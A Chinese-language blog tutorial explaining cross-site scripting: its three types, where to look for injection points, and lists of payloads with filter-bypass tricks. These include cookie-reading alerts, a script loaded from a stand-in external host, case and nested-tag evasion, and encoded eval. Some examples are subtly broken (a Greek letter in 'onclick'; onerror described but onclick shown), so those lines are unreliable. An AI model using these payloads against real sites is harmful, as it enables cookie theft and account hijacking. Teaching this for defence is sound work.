---
title: 什么是 XSS
date: 2024-12-25T10:34:39+08:00
author: LiangMingJian
---

# 简单介绍

HTML 注入与 XSS 攻击简单来说就是当用户在输入框输入内容时，后台对输入内容不做处理就直接添加入页面。此时，**用户可以刻意填写 HTML、JavaScript 脚本来作为文本输入**，这样这个页面就会出现一些非法加入的东西。

# XSS

跨站脚本攻击 XSS ( Cross Site Scripting )，为了不和层叠样式表 ( Cascading Style Sheets，CSS ) 的缩写混淆，所以将跨站脚本攻击缩写为 XSS。恶意攻击者往往会在 Web 页面里插入恶意 JavaScript 代码，当用户浏览该页面时，嵌入 Web 里面的 JavaScript 代码会被执行，从而达到恶意攻击用户的目的。

XSS 攻击主要分为以下三种

- 存储型 XSS：持久化的攻击。如果恶意攻击者在个人信息或发表文章等地方，插入代码，后端又没有过滤或过滤不严，那么这些代码就会被储存到服务器中，其他任何用户访问该页面时都会触发代码执行。
- 反射型 XSS：非持久化的攻击。需要欺骗用户自己去点击链接才能触发 XSS 代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。
- DOM 型 XSS：不经过后端的攻击。DOM-XSS 漏洞是基于文档对象模型 ( Document Objeet Model，DOM ) 的一种漏洞，DOM-XSS 是通过 URL 传入参数去控制触发的。可能触发 DOM 型 XSS 的属性有：document.referer，window.name，location，innerHTML，documen.write。具体操作是在 URL 中传入参数的值，然后客户端页面通过 JavaScript 脚本利用 DOM 的方法获得 URL 中参数的值，再通过 DOM 方法进行赋值或其他操作。

# XSS 的攻击载荷

## script 标签

```
<script>alert("hack")</script>   # 弹出 hack
<script>alert(/hack/)</script>   # 弹出 hack
<script>alert(1)</script>        # 弹出 1，对于数字可以不用引号
<script>alert(document.cookie)</script>      # 弹出 cookie
<script src=http://xxx.com/xss.js></script>  # 引用外部的 xss
```

## svg 标签

```
<svg onload="alert(1)">
<svg onload="alert(1)"/>
```

## img 标签

```
<img src=1 οnclick=alert("hack")>
<img src=1 οnclick=alert(document.cookie)>  # 弹出cookie
```

# XSS 漏洞的挖掘 

尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：

- URL的每一个参数
- URL本身
- 表单
- 搜索框

常见业务场景

- 重灾区：评论区、留言区、个人信息、订单信息等
- 针对型：站内信、网页即时通讯、私信、意见反馈
- 存在风险：搜索框、当前目录、图片属性等

# XSS 的简单过滤和绕过

## 区分大小写过滤标签

可以使用大小写绕过

```
<scripT>alert('hack')</scripT>
<sCript>alert("hey!")</scRipt>
```

## 不区分大小写过滤标签

可以使用嵌套的 script 标签绕过

```
<scr<script>ipt>alert('hack')</scr</script>ipt>
```

## 不区分大小写，过滤之间的所有内容

可以通过 img、body 等标签的 onerror 事件或者 iframe 等标签的 src 注入恶意的 JavaScript 代码。onerror 事件是专门针对 js 出错的，标签闭合性被破坏会触发这个事件。

```
<img src=1 οnclick=alert('hack')>
```

## 编码脚本代码绕过关键字过滤

有的时候，服务器往往会对代码中的关键字（ 如 alert ）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入。我们可以用 eval() 将编码过的语句解码后再执行。例如：`alert(1) = eval(\u0061\u006c\u0065\u0072\u0074(1))`

```
<script>eval(\u0061\u006c\u0065\u0072\u0074(1))</script>
```

## 主动闭合标签实现注入代码

 有些注入点出现在链接或属性中，此时可以使用`"`主动的闭合标签，实现代码的注入

```
";alert("I am coming again~");"
```

{{< details "参考文件" >}} 
1：[ XSS(跨站脚本攻击)详解  @615 ](https://www.cnblogs.com/wuqun/p/12484816.html)
{{< /details >}}
